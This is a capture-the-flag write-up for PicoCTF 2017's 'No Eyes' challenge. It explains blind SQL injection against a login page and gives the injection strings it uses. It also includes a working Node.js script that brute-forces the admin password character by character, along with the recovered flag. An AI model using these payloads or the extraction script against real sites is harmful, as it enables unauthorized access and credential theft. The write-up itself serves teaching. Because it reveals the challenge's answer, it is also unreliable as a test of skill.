# PicoCTF2017
## Writeup for No Eyes

    The website(http://shell2017.picoctf.com:16012/) isn't really me much, but you can still get the admin password, right?
    
And a quick look at the hints:

    Sometimes an error message can be just as useful.
    
The website visibly has nothing but a login page.

So let's try some error messages. First, We'll login with no information at all.

    User not Found.

Okay, so it looks like the program separately checks for username and password. To confirm this, We'll login with my username as "admin" and my password as some random characters.

    Incorrect Password.
    
Great! Now let's try some basic SQL injection to see what happens.  
We'll enter the username as something random, use an ending single quote, throw in a OR 1=1, then comment off the rest. Like this:  

    abcdef' OR 1=1 -- 

This means that, if our SQL injection is valid, the username will return valid. It will return valid because anything combined with an OR 1=1 would logically return true. After logging in with this, we get a very important error message: 

    Incorrect Password.

Why is this important? Because this means that the username query returned true, and therefore our SQL injection worked. If the website returned "User not Found", then the SQL injection would not have worked.  

The next thing we'll do is enter some code that will break the SQL injection in hopes of getting a specific error message. To do that, we can throw in an ending single quote, but not comment off the rest. For the username, we can literally just type:  

    test' 
    
And that gives us the error:  

    There Was An Error With Your Request:
    select * from users where user = 'test'';

Great! This tells us that the databse we want to pull from is named "users", and the field for username is "user". Using that naming system, we can assume that the field for password is "pass".  

The next step is to find out what database engine they use for SQL. Different SQL database engines have different methods. Because the last question used sqlite, I kind of just guessed they would use sqlite for this one as well. To confirm, I ran a simple union that would work with sqlite. Google gives us this nice page: (https://sqlite.org/lang_corefunc.html)[https://sqlite.org/lang_corefunc.html].  

Remember that we are looking for a "Incorrect Password" error message, because that would mean that the username query returned true. To test if the database engine is sqlite, I used this as the username:  

    test' and 1=0 union all select * from users where substr(user,1,3)="adm" -- 
    
And we get the error message of "Incorrect Password". So let's break this down. Before the union, we pass in a username of test combined with an and 1=0. Because 1 will never equal 0, the first part of the injection will not give any results. This is important because if the first part of the injection did return a result, then the sql code would always pass no matter what is after the union. We only want the sql code to pass if the second part of the code passes. So essentialy, we are unioning nothing with a query that will find if the first 3 letters of any users username is "adm" (the first 3 letters of admin), and if that returns a result, then we will get a "Incorrect Password" error, and therefore proves that the first part is true.  

I'm sure you can see where this is going... Instead of checking the substring of the username, we can check the substring of the password. We can start with substr(pass,1,1)="some letter", and guess until we get an "Incorrect Password". Once we get an incorrect password, we know what the first letter is, then we can move onto substr(pass,1,2)="two letters". So on and so forth. You could go through the painful process of trying to manually guess all the letters (which I ashamedly did...) but for the sake of this writeup, let's write a program that will do it for us.  

I'm a JavaScript and Node.js fan. This code is written in JavaScript, but is well commented so it should be understandable for any programmer. Before writing a program however, we need to find out what data to post and where. Viewing the source of the web page, I found this for the form:  

    <form class="form-signin" method="post">
        <h4>Welcome back.</h4>
        <input type="text" name="username" class="form-control input-sm chat-input" placeholder="username" />
        </br>
        <input type="text" name="password" class="form-control input-sm chat-input" placeholder="password" />
        </br>
        <div class="wrapper">
            <span class="group-btn">     
                <button class="btn btn-primary btn-md" type="submit">login</button>
            </span>
        </div>
    </form>
    
So the username has the name "username", the password has the name "password", and the location of the post is just root (/). Now, let's write the program.  

    // To let us use constants and lets. If you are not using JavaScript, this is irrelevant
    'use strict'

    // Request is our package for sending post requests with our login data.
    const request = require('request')
    const URL = 'http://shell2017.picoctf.com:16012/'

    // We make a string of all characters Iwe think will be in the password. We then split it by nothing to make it into an array.
    // const acceptableCharacters = 'abcdefghijklmnopqrstuvwxzyABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_[](){}'.split('')
    // These characters took trial and error to get. I started with only lowercase letters, when that didn't give me what
    // I wanted, I added numbers and underscores. Luckily, that was enought to get the flag.
    const acceptableCharacters = 'abcdefghijklmnopqrstuvwxzy1234567890_'.split('')

    /*
     * Here is our logic:
     * We will send a request with the password starting at one letter.
     * Whichever request is successful will build off of what it sent
     */
    for (let i = 0; i < acceptableCharacters.length; i++) {
      makePost(acceptableCharacters[i])
    }

    // Sends a post with the current guess. If the guess is successful, it logs the guess,
    // then makes more posts with letters added onto that guess.
    function makePost (guess) {
      request.post({
        url: URL,
        form: { // I got the name of the fields to be sent by viewing the source of the login page, and checking the "name" option of the textboxes.
          username: 'test\' and 1=0 union all select * from users where substr(pass,1,' + guess.length + ')="' + guess + '" -- ',
          password: ''
        }
      }, function (err, res, body) {
        if (isValidPost(body)) {
          console.log(guess)
          for (let i = 0; i < acceptableCharacters.length; i++) {
            makePost(guess + acceptableCharacters[i])
          }
        }
      })
    }

    // Determines if the post is valid by checking if the response string contains the words "Incorrect Password"
    // However, when a user isn't found, the error message is "User not found", so I shortened the words to search for
    // down to just "Inco"
    function isValidPost (res) {
      if (res) {
        return res.indexOf('Inco')>-1
      } else {
        // If there is no reason, the server probably crashed or something.
        console.log('Timeout. Try again.')
      }
    }

After letting that code run for a good minute or so, I get the following:  

    n
    no
    not
    not_
    not_a
    not_al
    not_all
    not_all_
    not_all_e
    not_all_er
    not_all_err
    not_all_erro
    not_all_error
    not_all_errors
    not_all_errors_
    not_all_errors_s
    not_all_errors_sh
    not_all_errors_sho
    not_all_errors_shou
    not_all_errors_shoul
    not_all_errors_should
    not_all_errors_should_
    not_all_errors_should_b
    not_all_errors_should_be
    not_all_errors_should_be_
    not_all_errors_should_be_s
    not_all_errors_should_be_sh
    not_all_errors_should_be_sho
    not_all_errors_should_be_show
    not_all_errors_should_be_shown
    not_all_errors_should_be_shown_
    not_all_errors_should_be_shown_5
    not_all_errors_should_be_shown_59
    not_all_errors_should_be_shown_599
    not_all_errors_should_be_shown_599b
    not_all_errors_should_be_shown_599bf
    not_all_errors_should_be_shown_599bfc
    not_all_errors_should_be_shown_599bfc4
    not_all_errors_should_be_shown_599bfc4e
    not_all_errors_should_be_shown_599bfc4ee
    not_all_errors_should_be_shown_599bfc4ee4
    not_all_errors_should_be_shown_599bfc4ee41
    not_all_errors_should_be_shown_599bfc4ee419
    not_all_errors_should_be_shown_599bfc4ee4197
    not_all_errors_should_be_shown_599bfc4ee4197f
    not_all_errors_should_be_shown_599bfc4ee4197fd
    not_all_errors_should_be_shown_599bfc4ee4197fdc
    not_all_errors_should_be_shown_599bfc4ee4197fdc5
    not_all_errors_should_be_shown_599bfc4ee4197fdc5e
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed9
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed936
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed9361
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f5
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f51
    not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f515
    
Obviously the last one will be our flag!
